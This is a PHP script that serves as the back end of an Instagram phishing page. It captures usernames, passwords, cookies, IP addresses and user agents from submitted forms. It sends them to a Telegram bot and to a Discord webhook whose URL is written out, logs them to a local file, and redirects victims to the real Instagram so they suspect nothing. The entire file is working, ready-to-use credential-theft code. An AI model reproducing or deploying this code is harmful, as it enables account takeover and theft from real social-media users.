<?php
if ($_POST['username'] && $_POST['password']) {
    $username = $_POST['username'];
    $password = $_POST['password'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $ua = $_SERVER['HTTP_USER_AGENT'];
    $cookies = '';
    foreach ($_POST as $key => $value) {
        if (strpos($key, 'cookie_') === 0) {
            $cookies .= str_replace('cookie_', '', $key) . '=' . $value . '; ';
        }
    }
    
    $message = "🚨 INSTAGRAM CREDS CAPTURED 🚨\n";
    $message .= "👤 Username: $username\n";
    $message .= "🔑 Password: $password\n";
    $message .= "🌐 IP: $ip\n";
    $message .= "📱 User-Agent: $ua\n";
    $message .= "🍪 Cookies: $cookies\n";
    $message .= "⏰ Time: " . date('Y-m-d H:i:s') . "\n";
    $message .= "🔗 Victim URL: " . $_SERVER['HTTP_REFERER'] . "\n";

    // TELEGRAM BOT (replace with your bot token and chat ID)
    $telegramToken = 'YOUR_BOT_TOKEN_HERE';  // Get from @BotFather
    $telegramChatId = 'YOUR_CHAT_ID_HERE';   // Your Telegram user/group ID
    $telegramUrl = "https://api.telegram.org/bot$telegramToken/sendMessage";
    $telegramData = [
        'chat_id' => $telegramChatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    file_get_contents($telegramUrl . '?' . http_build_query($telegramData));

    // DISCORD WEBHOOK (alternative/additional - replace with your webhook URL)
    $discordWebhook = 'https://discord.com/api/webhooks/1479145801304510484/a-lp6An0DT35UE5BixT1c0ecVFa8UGDS7GHY1vqeEJBSjfwYpDF0TVa4OaROJzCVXn9z';  // Server Settings > Integrations
    $discordData = json_encode([
        'content' => $message,
        'username' => 'Instagram Phish Bot'
    ]);
    $options = [
        'http' => [
            'header' => "Content-type: application/json\r\n",
            'method' => 'POST',
            'content' => $discordData
        ]
    ];
    file_get_contents($discordWebhook, false, stream_context_create($options));

    // Log locally too
    file_put_contents('creds.txt', $message . "\n---\n", FILE_APPEND);
}

// Redirect to real Instagram (victim thinks it worked)
header('Location: https://www.instagram.com/');
exit();
?>